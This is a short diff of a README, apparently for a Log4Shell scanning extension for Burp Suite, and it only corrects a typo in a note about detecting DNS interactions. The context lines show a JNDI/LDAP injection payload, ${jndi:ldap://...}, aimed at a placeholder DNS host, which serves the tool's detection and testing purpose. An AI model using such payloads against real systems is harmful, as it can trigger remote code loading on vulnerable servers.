@@ -15,7 +15,7 @@ Example:
 ${jndi:ldap://127.0.0.1#your.dns.name.tld/x}
 ```
 
-Burp Collaborator can't handle invalid DNS names so your interactions will not be detected! You can your a network sniffer to observe DNS traffic.
+Burp Collaborator can't handle invalid DNS names so your interactions will not be detected! You can use a network sniffer to observe DNS traffic.
 
 # Original README
 
